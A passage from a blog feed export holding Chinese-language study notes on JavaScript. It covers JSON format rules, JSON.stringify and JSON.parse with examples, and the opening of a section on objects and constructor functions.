0.7853981633974483</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-Math对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0025</title>
    <url>/2021/05/16/%E6%89%93%E5%8D%A10025/</url>
    <content><![CDATA[<p><font color=#ffc20e>白日不到处，青春恰自来。苔花如米小，也学牡丹开。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="11-JSON对象"><a href="#11-JSON对象" class="headerlink" title="11. JSON对象"></a>11. JSON对象</h3><h4 id="11-1-JSON格式"><a href="#11-1-JSON格式" class="headerlink" title="11.1 JSON格式"></a>11.1 JSON格式</h4><p>JSON 格式（JavaScript Object Notation 的缩写）是一种用于数据交换的文本格式，2001年由 Douglas Crockford 提出，目的是取代繁琐笨重的 XML 格式。</p>
<p>相比 XML 格式，JSON 格式有两个显著的优点：书写简单，一目了然；符合 JavaScript 原生语法，可以由解释引擎直接处理，不用另外添加解析代码。所以，JSON 迅速被接受，已经成为各大网站交换数据的标准格式，并被写入标准。</p>
<p>每个 JSON 对象就是一个值，可能是一个数组或对象，也可能是一个原始类型的值。总之，只能是一个值，不能是两个或更多的值。</p>
<p>JSON 对值的类型和格式有严格的规定。</p>
<ol>
<li><p>复合类型的值只能是数组或对象，不能是函数、正则表达式对象、日期对象。</p>
</li>
<li><p>原始类型的值只有四种：字符串、数值（必须以十进制表示）、布尔值和<code>null</code>（不能使用<code>NaN</code>, <code>Infinity</code>, <code>-Infinity</code>和<code>undefined</code>）。</p>
</li>
<li><p>字符串必须使用双引号表示，不能使用单引号。</p>
</li>
<li><p>对象的键名必须放在双引号里面。</p>
</li>
<li><p>数组或对象最后一个成员的后面，不能加逗号。</p>
</li>
</ol>
<span id="more"></span>
<p>以下都是合法的 JSON。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>]</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;one&quot;</span>: <span class="number">1</span>, <span class="string">&quot;two&quot;</span>: <span class="number">2</span>, <span class="string">&quot;three&quot;</span>: <span class="number">3</span> &#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;names&quot;</span>: [<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;李四&quot;</span>] &#125;</span><br><span class="line"></span><br><span class="line">[ &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;李四&quot;</span>&#125; ]</span><br></pre></td></tr></table></figure>
<p>以下都是不合法的 JSON。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">32</span> &#125;  <span class="comment">// 属性名必须使用双引号</span></span><br><span class="line"></span><br><span class="line">[<span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>, <span class="number">0xFFF</span>] <span class="comment">// 不能使用十六进制值</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="literal">undefined</span> &#125; <span class="comment">// 不能使用 undefined</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="string">&quot;birthday&quot;</span>: <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;Fri, 26 Aug 2011 07:13:10 GMT&#x27;</span>),</span><br><span class="line">  <span class="string">&quot;getName&quot;</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="comment">// 属性值不能使用函数和日期对象</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>null</code>、空数组和空对象都是合法的 JSON 值。</p>
<h4 id="11-2-JSON-对象"><a href="#11-2-JSON-对象" class="headerlink" title="11.2 JSON 对象"></a>11.2 JSON 对象</h4><p><code>JSON</code>对象是 JavaScript 的原生对象，用来处理 JSON 格式数据。它有两个静态方法：<code>JSON.stringify()</code>和<code>JSON.parse()</code>。</p>
<h4 id="11-3-JSON-stringify"><a href="#11-3-JSON-stringify" class="headerlink" title="11.3 JSON.stringify()"></a>11.3 JSON.stringify()</h4><h5 id="11-3-1-基本用法"><a href="#11-3-1-基本用法" class="headerlink" title="11.3.1 基本用法"></a>11.3.1 基本用法</h5><p><code>JSON.stringify()</code>方法用于将一个值转为 JSON 字符串。该字符串符合 JSON 格式，并且可以被<code>JSON.parse()</code>方法还原。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;abc&#x27;</span>) <span class="comment">// &quot;&quot;abc&quot;&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="number">1</span>) <span class="comment">// &quot;1&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="literal">false</span>) <span class="comment">// &quot;false&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify([]) <span class="comment">// &quot;[]&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123;&#125;) <span class="comment">// &quot;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify([<span class="number">1</span>, <span class="string">&quot;false&quot;</span>, <span class="literal">false</span>])</span><br><span class="line"><span class="comment">// &#x27;[1,&quot;false&quot;,false]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span> &#125;)</span><br><span class="line"><span class="comment">// &#x27;&#123;&quot;name&quot;:&quot;张三&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码将各种类型的值，转成 JSON 字符串。</p>
<p>注意，对于原始类型的字符串，转换结果会带双引号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;foo&#x27;</span>) === <span class="string">&quot;foo&quot;</span> <span class="comment">// false</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;foo&#x27;</span>) === <span class="string">&quot;\&quot;foo\&quot;&quot;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>foo</code>，被转成了<code>&quot;\&quot;foo\&quot;&quot;</code>。这是因为将来还原的时候，内层双引号可以让 JavaScript 引擎知道，这是一个字符串，而不是其他类型的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="literal">false</span>) <span class="comment">// &quot;false&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;false&#x27;</span>) <span class="comment">// &quot;\&quot;false\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果不是内层的双引号，将来还原的时候，引擎就无法知道原始值是布尔值还是字符串。</p>
<p>如果对象的属性是<code>undefined</code>、函数或 XML 对象，该属性会被<code>JSON.stringify()</code>过滤。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="literal">undefined</span>,</span><br><span class="line">  b: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj) <span class="comment">// &quot;&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>的<code>a</code>属性是<code>undefined</code>，而<code>b</code>属性是一个函数，结果都被<code>JSON.stringify</code>过滤。</p>
<p>如果数组的成员是<code>undefined</code>、函数或 XML 对象，则这些值被转成<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="literal">undefined</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;];</span><br><span class="line"><span class="built_in">JSON</span>.stringify(arr) <span class="comment">// &quot;[null,null]&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数组<code>arr</code>的成员是<code>undefined</code>和函数，它们都被转成了<code>null</code>。</p>
<p>正则对象会被转成空对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="regexp">/foo/</span>) <span class="comment">// &quot;&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>JSON.stringify()</code>方法会忽略对象的不可遍历的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(obj, &#123;</span><br><span class="line">  <span class="string">&#x27;foo&#x27;</span>: &#123;</span><br><span class="line">    value: <span class="number">1</span>,</span><br><span class="line">    enumerable: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&#x27;bar&#x27;</span>: &#123;</span><br><span class="line">    value: <span class="number">2</span>,</span><br><span class="line">    enumerable: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj); <span class="comment">// &quot;&#123;&quot;foo&quot;:1&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>bar</code>是<code>obj</code>对象的不可遍历属性，<code>JSON.stringify</code>方法会忽略这个属性。</p>
<h5 id="11-3-2-第二个参数"><a href="#11-3-2-第二个参数" class="headerlink" title="11.3.2 第二个参数"></a>11.3.2 第二个参数</h5><p><code>JSON.stringify()</code>方法还可以接受一个数组，作为第二个参数，指定参数对象的哪些属性需要转成字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="string">&#x27;prop1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;prop2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;prop3&#x27;</span>: <span class="string">&#x27;value3&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> selectedProperties = [<span class="string">&#x27;prop1&#x27;</span>, <span class="string">&#x27;prop2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj, selectedProperties)</span><br><span class="line"><span class="comment">// &quot;&#123;&quot;prop1&quot;:&quot;value1&quot;,&quot;prop2&quot;:&quot;value2&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>JSON.stringify()</code>方法的第二个参数指定，只转<code>prop1</code>和<code>prop2</code>两个属性。<br>这个类似白名单的数组，只对对象的属性有效，对数组无效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>], [<span class="string">&#x27;0&#x27;</span>])</span><br><span class="line"><span class="comment">// &quot;[&quot;a&quot;,&quot;b&quot;]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123;<span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;b&#x27;</span>&#125;, [<span class="string">&#x27;0&#x27;</span>])</span><br><span class="line"><span class="comment">// &quot;&#123;&quot;0&quot;:&quot;a&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第二个参数指定 JSON 格式只转<code>0</code>号属性，实际上对数组是无效的，只对对象有效。</p>
<p>第二个参数还可以是一个函数，用来更改<code>JSON.stringify()</code>的返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    value = <span class="number">2</span> * value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;, f)</span><br><span class="line"><span class="comment">// &#x27;&#123;&quot;a&quot;: 2,&quot;b&quot;: 4&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中的<code>f</code>函数，接受两个参数，分别是被转换的对象的键名和键值。如果键值是数值，就将它乘以2，否则就原样返回。</p>
<p>注意，这个处理函数是递归处理所有的键。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: &#123;<span class="attr">b</span>: <span class="number">1</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[&quot;</span>+ key +<span class="string">&quot;]:&quot;</span> + value);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj, f)</span><br><span class="line"><span class="comment">// []:[object Object]</span></span><br><span class="line"><span class="comment">// [a]:[object Object]</span></span><br><span class="line"><span class="comment">// [b]:1</span></span><br><span class="line"><span class="comment">// &#x27;&#123;&quot;a&quot;:&#123;&quot;b&quot;:1&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>一共会被f函数处理三次，输出的最后那行是<code>JSON.stringify()</code>的默认输出。第一次键名为空，键值是整个对象<code>obj</code>；第二次键名为<code>a</code>，键值是<code>&#123;b: 1&#125;</code>；第三次键名为<code>b</code>，键值为<code>1</code>。</p>
<p>递归处理中，每一次处理的对象，都是前一次返回的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj, f)</span><br><span class="line"><span class="comment">// &quot;&#123;&quot;b&quot;: 4&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>f</code>函数修改了对象<code>obj</code>，接着<code>JSON.stringify()</code>方法就递归处理修改后的对象<code>obj</code>。</p>
<p>如果处理函数返回<code>undefined</code>或没有返回值，则该属性会被忽略。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span>(value) === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">a</span>: <span class="string">&quot;abc&quot;</span>, <span class="attr">b</span>: <span class="number">123</span> &#125;, f)</span><br><span class="line"><span class="comment">// &#x27;&#123;&quot;b&quot;: 123&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a</code>属性经过处理后，返回<code>undefined</code>，于是该属性被忽略了</p>
<h5 id="11-3-3-第三个参数"><a href="#11-3-3-第三个参数" class="headerlink" title="11.3.3 第三个参数"></a>11.3.3 第三个参数</h5><p><code>JSON.stringify()</code>还可以接受第三个参数，用于增加返回的 JSON 字符串的可读性。</p>
<p>默认返回的是单行字符串，对于大型的 JSON 对象，可读性非常差。第三个参数使得每个属性单独占据一行，并且将每个属性前面添加指定的前缀（不超过10个字符）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认输出</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">p1</span>: <span class="number">1</span>, <span class="attr">p2</span>: <span class="number">2</span> &#125;)</span><br><span class="line"><span class="comment">// JSON.stringify(&#123; p1: 1, p2: 2 &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分行输出</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">p1</span>: <span class="number">1</span>, <span class="attr">p2</span>: <span class="number">2</span> &#125;, <span class="literal">null</span>, <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">// 	&quot;p1&quot;: 1,</span></span><br><span class="line"><span class="comment">// 	&quot;p2&quot;: 2</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，第三个属性<code>\t</code>在每个属性前面添加一个制表符，然后分行显示。</p>
<p>第三个属性如果是一个数字，则表示每个属性前面添加的空格（最多不超过10个）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">p1</span>: <span class="number">1</span>, <span class="attr">p2</span>: <span class="number">2</span> &#125;, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;&#123;</span></span><br><span class="line"><span class="comment">  &quot;p1&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;p2&quot;: 2</span></span><br><span class="line"><span class="comment">&#125;&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h5 id="11-3-4-参数对象的-toJSON-方法"><a href="#11-3-4-参数对象的-toJSON-方法" class="headerlink" title="11.3.4 参数对象的 toJSON() 方法"></a>11.3.4 参数对象的 toJSON() 方法</h5><p>如果参数对象有自定义的<code>toJSON()</code>方法，那么<code>JSON.stringify()</code>会使用这个方法的返回值作为参数，而忽略原对象的其他属性。</p>
<p>下面是一个普通的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&#x27;三&#x27;</span>,</span><br><span class="line">  lastName: <span class="string">&#x27;张&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title">fullName</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.lastName + <span class="built_in">this</span>.firstName;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(user)</span><br><span class="line"><span class="comment">// &quot;&#123;&quot;firstName&quot;:&quot;三&quot;,&quot;lastName&quot;:&quot;张&quot;,&quot;fullName&quot;:&quot;张三&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>现在，为这个对象加上<code>toJSON()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&#x27;三&#x27;</span>,</span><br><span class="line">  lastName: <span class="string">&#x27;张&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title">fullName</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.lastName + <span class="built_in">this</span>.firstName;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  toJSON: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      name: <span class="built_in">this</span>.lastName + <span class="built_in">this</span>.firstName</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(user)</span><br><span class="line"><span class="comment">// &quot;&#123;&quot;name&quot;:&quot;张三&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>JSON.stringify()</code>发现参数对象有<code>toJSON()</code>方法，就直接使用这个方法的返回值作为参数，而忽略原对象的其他参数。</p>
<p><code>Date</code>对象就有一个自己的<code>toJSON()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;2015-01-01&#x27;</span>);</span><br><span class="line">date.toJSON() <span class="comment">// &quot;2015-01-01T00:00:00.000Z&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(date) <span class="comment">// &quot;&quot;2015-01-01T00:00:00.000Z&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>JSON.stringify()</code>发现处理的是<code>Date</code>对象实例，就会调用这个实例对象的<code>toJSON()</code>方法，将该方法的返回值作为参数。</p>
<p><code>toJSON()</code>方法的一个应用是，将正则对象自动转为字符串。因为<code>JSON.stringify()</code>默认不能转换正则对象，但是设置了<code>toJSON()</code>方法以后，就可以转换正则对象了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  reg: <span class="regexp">/foo/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置 toJSON 方法时</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj) <span class="comment">// &quot;&#123;&quot;reg&quot;:&#123;&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 toJSON 方法时</span></span><br><span class="line"><span class="built_in">RegExp</span>.prototype.toJSON = <span class="built_in">RegExp</span>.prototype.toString;</span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="regexp">/foo/</span>) <span class="comment">// &quot;&quot;/foo/&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码在正则对象的原型上面部署了<code>toJSON()</code>方法，将其指向<code>toString()</code>方法，因此转换成 JSON 格式时，正则对象就先调用<code>toJSON()</code>方法转为字符串，然后再被<code>JSON.stringify()</code>方法处理。</p>
<h4 id="11-4-JSON-parse"><a href="#11-4-JSON-parse" class="headerlink" title="11.4 JSON.parse()"></a>11.4 JSON.parse()</h4><p><code>JSON.parse()</code>方法用于将 JSON 字符串转换成对应的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&#125;&#x27;</span>) <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;true&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&quot;foo&quot;&#x27;</span>) <span class="comment">// &quot;foo&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;[1, 5, &quot;false&quot;]&#x27;</span>) <span class="comment">// [1, 5, &quot;false&quot;]</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;null&#x27;</span>) <span class="comment">// null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;name&quot;: &quot;张三&quot;&#125;&#x27;</span>);</span><br><span class="line">o.name <span class="comment">// 张三</span></span><br></pre></td></tr></table></figure>
<p>如果传入的字符串不是有效的 JSON 格式，<code>JSON.parse()</code>方法将报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&quot;&#x27;String&#x27;&quot;</span>) <span class="comment">// illegal single quotes</span></span><br><span class="line"><span class="comment">// SyntaxError: Unexpected token ILLEGAL</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，双引号字符串中是一个单引号字符串，因为单引号字符串不符合 JSON 格式，所以报错。</p>
<p>为了处理解析错误，可以将<code>JSON.parse()</code>方法放在<code>try...catch</code>代码块中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="built_in">JSON</span>.parse(<span class="string">&quot;&#x27;String&#x27;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;parsing error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>JSON.parse()</code>方法可以接受一个处理函数，作为第二个参数，用法与<code>JSON.stringify()</code>方法类似。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (key === <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> value + <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125;&#x27;</span>, f)</span><br><span class="line"><span class="comment">// &#123;a: 11, b: 2&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>JSON.parse()</code>的第二个参数是一个函数，如果键名是<code>a</code>，该函数会将键值加上10。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-JSON对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0026</title>
    <url>/2021/05/17/%E6%89%93%E5%8D%A10026/</url>
    <content><![CDATA[<p><font color=#8e7437>空荡荡的树上 树叶固执地挂着妄想何方 云身后的昏黄 揭穿了好几颗心的迷惘 杂乱的楼房太遮挡 不认输的脸庞 思念追寻的 那么的相像</font></p>
<h2 id="JS面向对象编程"><a href="#JS面向对象编程" class="headerlink" title="JS面向对象编程"></a>JS面向对象编程</h2><h3 id="1-实例对象与new命令"><a href="#1-实例对象与new命令" class="headerlink" title="1. 实例对象与new命令"></a>1. 实例对象与new命令</h3><h4 id="1-1-对象是什么"><a href="#1-1-对象是什么" class="headerlink" title="1.1 对象是什么"></a>1.1 对象是什么</h4><p>面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。</p>
<p>每一个对象都是功能中心，具有明确分工，可以完成接受信息、处理数据、发出信息等任务。对象可以复用，通过继承机制还可以定制。因此，面向对象编程具有灵活、代码可复用、高度模块化等特点，容易维护和开发，比起由一系列函数或指令组成的传统的过程式编程（procedural programming），更适合多人合作的大型软件项目。</p>
<p>那么，“对象”（object）到底是什么？我们从两个层次来理解。</p>
<span id="more"></span>
<h6 id="1-对象是单个实物的抽象。"><a href="#1-对象是单个实物的抽象。" class="headerlink" title="(1)对象是单个实物的抽象。"></a>(1)对象是单个实物的抽象。</h6><p>一本书、一辆汽车、一个人都可以是对象，一个数据库、一张网页、一个远程服务器连接也可以是对象。当实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。</p>
<h6 id="2-对象是一个容器，封装了属性（property）和方法（method）。"><a href="#2-对象是一个容器，封装了属性（property）和方法（method）。" class="headerlink" title="(2)对象是一个容器，封装了属性（property）和方法（method）。"></a>(2)对象是一个容器，封装了属性（property）和方法（method）。</h6><p>属性是对象的状态，方法是对象的行为（完成某种任务）。比如，我们可以把动物抽象为<code>animal</code>对象，使用“属性”记录具体是哪一种动物，使用“方法”表示动物的某种行为（奔跑、捕猎、休息等等）。</p>
<h4 id="1-2-构造函数"><a href="#1-2-构造函数" class="headerlink" title="1.2 构造函数"></a>1.2 构造函数</h4><p>面向对象编程的第一步，就是要生成对象。前面说过，对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。</p>
<p>典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。</p>
<p>JavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成实例对象的函数。它就是对象的模板，描述实例对象的基本结构。一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。</p>
<p>构造函数就是一个普通的函数，但具有自己的特征和用法。</p>
